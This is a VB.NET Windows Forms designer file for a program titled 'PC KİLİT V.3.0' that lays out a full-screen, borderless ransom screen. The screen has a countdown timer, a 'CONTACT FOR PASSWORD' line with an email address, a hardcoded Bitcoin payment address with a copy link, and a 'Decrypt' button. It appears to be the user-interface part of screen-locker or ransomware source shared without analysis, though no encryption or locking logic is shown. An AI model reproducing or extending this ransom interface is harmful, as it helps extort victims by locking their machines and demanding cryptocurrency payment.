﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form2
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form2))
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.LinkLabel1 = New System.Windows.Forms.LinkLabel()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.TextBox3 = New System.Windows.Forms.TextBox()
        Me.TextBox4 = New System.Windows.Forms.TextBox()
        Me.TextBox5 = New System.Windows.Forms.TextBox()
        Me.saniye = New System.Windows.Forms.ComboBox()
        Me.dakika = New System.Windows.Forms.ComboBox()
        Me.saat = New System.Windows.Forms.ComboBox()
        Me.Timer3 = New System.Windows.Forms.Timer(Me.components)
        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
        Me.GrayButton2 = New Pc_Klit_V._3._0.GrayButton()
        Me.GrayButton1 = New Pc_Klit_V._3._0.GrayButton()
        Me.Timer4 = New System.Windows.Forms.Timer(Me.components)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Timer2
        '
        Me.Timer2.Enabled = True
        Me.Timer2.Interval = 200
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'TextBox1
        '
        Me.TextBox1.AcceptsReturn = True
        Me.TextBox1.Anchor = System.Windows.Forms.AnchorStyles.None
        Me.TextBox1.BackColor = System.Drawing.Color.DarkGreen
        Me.TextBox1.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.TextBox1.ForeColor = System.Drawing.Color.Red
        Me.TextBox1.Location = New System.Drawing.Point(173, 389)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(595, 31)
        Me.TextBox1.TabIndex = 15
        Me.TextBox1.Text = "CONTACT FOR PASSWORD :yangshack@gmail.com"
        Me.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.TextBox1.UseSystemPasswordChar = True
        '
        'Label1
        '
        Me.Label1.Anchor = System.Windows.Forms.AnchorStyles.None
        Me.Label1.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.Label1.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 48.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.Label1.ForeColor = System.Drawing.Color.Red
        Me.Label1.Location = New System.Drawing.Point(97, 243)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(736, 100)
        Me.Label1.TabIndex = 14
        Me.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'PictureBox1
        '
        Me.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.PictureBox1.Enabled = False
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(0, 0)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(1331, 595)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 16
        Me.PictureBox1.TabStop = False
        '
        'CheckBox2
        '
        Me.CheckBox2.Anchor = System.Windows.Forms.AnchorStyles.None
        Me.CheckBox2.AutoSize = True
        Me.CheckBox2.BackColor = System.Drawing.Color.Gray
        Me.CheckBox2.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.CheckBox2.ForeColor = System.Drawing.Color.Navy
        Me.CheckBox2.Location = New System.Drawing.Point(518, 356)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(176, 24)
        Me.CheckBox2.TabIndex = 17
        Me.CheckBox2.Text = "SHOW PASSWORD"
        Me.CheckBox2.UseVisualStyleBackColor = False
        '
        'Label3
        '
        Me.Label3.Anchor = System.Windows.Forms.AnchorStyles.Left
        Me.Label3.AutoSize = True
        Me.Label3.BackColor = System.Drawing.SystemColors.MenuHighlight
        Me.Label3.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.Label3.Location = New System.Drawing.Point(869, 350)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(224, 25)
        Me.Label3.TabIndex = 18
        Me.Label3.Text = "BITCOIN ADDRESS:"
        '
        'LinkLabel1
        '
        Me.LinkLabel1.Anchor = System.Windows.Forms.AnchorStyles.Left
        Me.LinkLabel1.AutoSize = True
        Me.LinkLabel1.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.LinkLabel1.Location = New System.Drawing.Point(1120, 350)
        Me.LinkLabel1.Name = "LinkLabel1"
        Me.LinkLabel1.Size = New System.Drawing.Size(66, 25)
        Me.LinkLabel1.TabIndex = 20
        Me.LinkLabel1.TabStop = True
        Me.LinkLabel1.Text = "Copy"
        '
        'TextBox2
        '
        Me.TextBox2.Anchor = System.Windows.Forms.AnchorStyles.Left
        Me.TextBox2.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.Suggest
        Me.TextBox2.BackColor = System.Drawing.Color.Gray
        Me.TextBox2.Font = New System.Drawing.Font("Microsoft Sans Serif", 14.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.TextBox2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.TextBox2.Location = New System.Drawing.Point(870, 389)
        Me.TextBox2.Multiline = True
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.ReadOnly = True
        Me.TextBox2.Size = New System.Drawing.Size(453, 35)
        Me.TextBox2.TabIndex = 21
        Me.TextBox2.Text = "3Qm7QKk91wLTPXpbhNG69styGKsY3LVMMg"
        Me.TextBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'PictureBox2
        '
        Me.PictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.InitialImage = CType(resources.GetObject("PictureBox2.InitialImage"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(0, 0)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(1376, 215)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox2.TabIndex = 22
        Me.PictureBox2.TabStop = False
        Me.PictureBox2.WaitOnLoad = True
        '
        'Label2
        '
        Me.Label2.AccessibleRole = System.Windows.Forms.AccessibleRole.Cursor
        Me.Label2.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.Font = New System.Drawing.Font("Modern No. 20", 14.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.LimeGreen
        Me.Label2.Location = New System.Drawing.Point(81, 158)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(1129, 41)
        Me.Label2.TabIndex = 23
        Me.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'Label4
        '
        Me.Label4.Anchor = System.Windows.Forms.AnchorStyles.Left
        Me.Label4.BackColor = System.Drawing.Color.Red
        Me.Label4.Font = New System.Drawing.Font("Stencil", 72.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.Location = New System.Drawing.Point(870, 243)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(449, 100)
        Me.Label4.TabIndex = 24
        Me.Label4.Text = "00:00:00"
        '
        'TextBox3
        '
        Me.TextBox3.BackColor = System.Drawing.SystemColors.ScrollBar
        Me.TextBox3.Location = New System.Drawing.Point(12, 568)
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(138, 20)
        Me.TextBox3.TabIndex = 30
        Me.TextBox3.Visible = False
        '
        'TextBox4
        '
        Me.TextBox4.BackColor = System.Drawing.SystemColors.ScrollBar
        Me.TextBox4.Location = New System.Drawing.Point(12, 542)
        Me.TextBox4.Name = "TextBox4"
        Me.TextBox4.Size = New System.Drawing.Size(138, 20)
        Me.TextBox4.TabIndex = 29
        Me.TextBox4.Visible = False
        '
        'TextBox5
        '
        Me.TextBox5.BackColor = System.Drawing.SystemColors.ScrollBar
        Me.TextBox5.Location = New System.Drawing.Point(12, 516)
        Me.TextBox5.Name = "TextBox5"
        Me.TextBox5.Size = New System.Drawing.Size(138, 20)
        Me.TextBox5.TabIndex = 28
        Me.TextBox5.Visible = False
        '
        'saniye
        '
        Me.saniye.BackColor = System.Drawing.SystemColors.ScrollBar
        Me.saniye.FormattingEnabled = True
        Me.saniye.Location = New System.Drawing.Point(12, 489)
        Me.saniye.Name = "saniye"
        Me.saniye.Size = New System.Drawing.Size(42, 21)
        Me.saniye.TabIndex = 27
        Me.saniye.Visible = False
        '
        'dakika
        '
        Me.dakika.BackColor = System.Drawing.SystemColors.ScrollBar
        Me.dakika.FormattingEnabled = True
        Me.dakika.Location = New System.Drawing.Point(60, 489)
        Me.dakika.Name = "dakika"
        Me.dakika.Size = New System.Drawing.Size(42, 21)
        Me.dakika.TabIndex = 26
        Me.dakika.Visible = False
        '
        'saat
        '
        Me.saat.BackColor = System.Drawing.SystemColors.ScrollBar
        Me.saat.FormattingEnabled = True
        Me.saat.Location = New System.Drawing.Point(108, 489)
        Me.saat.Name = "saat"
        Me.saat.Size = New System.Drawing.Size(42, 21)
        Me.saat.TabIndex = 25
        Me.saat.Visible = False
        '
        'Timer3
        '
        Me.Timer3.Interval = 1000
        '
        'PictureBox3
        '
        Me.PictureBox3.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.PictureBox3.Image = CType(resources.GetObject("PictureBox3.Image"), System.Drawing.Image)
        Me.PictureBox3.Location = New System.Drawing.Point(0, 363)
        Me.PictureBox3.Name = "PictureBox3"
        Me.PictureBox3.Size = New System.Drawing.Size(1331, 232)
        Me.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox3.TabIndex = 32
        Me.PictureBox3.TabStop = False
        '
        'GrayButton2
        '
        Me.GrayButton2.Anchor = System.Windows.Forms.AnchorStyles.Left
        Me.GrayButton2.Location = New System.Drawing.Point(185, 350)
        Me.GrayButton2.Name = "GrayButton2"
        Me.GrayButton2.Size = New System.Drawing.Size(124, 34)
        Me.GrayButton2.TabIndex = 31
        Me.GrayButton2.Text = "GET HELP"
        '
        'GrayButton1
        '
        Me.GrayButton1.Anchor = System.Windows.Forms.AnchorStyles.Right
        Me.GrayButton1.Font = New System.Drawing.Font("Microsoft Sans Serif", 14.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.GrayButton1.Location = New System.Drawing.Point(315, 351)
        Me.GrayButton1.Name = "GrayButton1"
        Me.GrayButton1.Size = New System.Drawing.Size(156, 37)
        Me.GrayButton1.TabIndex = 31
        Me.GrayButton1.Text = "Decrypt"
        '
        'Timer4
        '
        Me.Timer4.Enabled = True
        Me.Timer4.Interval = 10
        '
        'Form2
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(1331, 595)
        Me.Controls.Add(Me.PictureBox3)
        Me.Controls.Add(Me.GrayButton2)
        Me.Controls.Add(Me.GrayButton1)
        Me.Controls.Add(Me.TextBox3)
        Me.Controls.Add(Me.TextBox4)
        Me.Controls.Add(Me.TextBox5)
        Me.Controls.Add(Me.saniye)
        Me.Controls.Add(Me.dakika)
        Me.Controls.Add(Me.saat)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.PictureBox2)
        Me.Controls.Add(Me.TextBox2)
        Me.Controls.Add(Me.LinkLabel1)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.CheckBox2)
        Me.Controls.Add(Me.TextBox1)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.PictureBox1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.KeyPreview = True
        Me.Name = "Form2"
        Me.Text = "PC KİLİT V.3.0"
        Me.WindowState = System.Windows.Forms.FormWindowState.Maximized
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(false)
        Me.PerformLayout

End Sub
    Friend WithEvents Timer2 As System.Windows.Forms.Timer
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Protected Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents CheckBox2 As System.Windows.Forms.CheckBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents LinkLabel1 As System.Windows.Forms.LinkLabel
    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
    Friend WithEvents saniye As System.Windows.Forms.ComboBox
    Friend WithEvents dakika As System.Windows.Forms.ComboBox
    Friend WithEvents saat As System.Windows.Forms.ComboBox
    Friend WithEvents Timer3 As System.Windows.Forms.Timer
    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
    Friend WithEvents GrayButton1 As Pc_Klit_V._3._0.GrayButton
    Friend WithEvents GrayButton2 As Pc_Klit_V._3._0.GrayButton
    Friend WithEvents PictureBox3 As System.Windows.Forms.PictureBox
    Friend WithEvents Timer4 As System.Windows.Forms.Timer
End Class
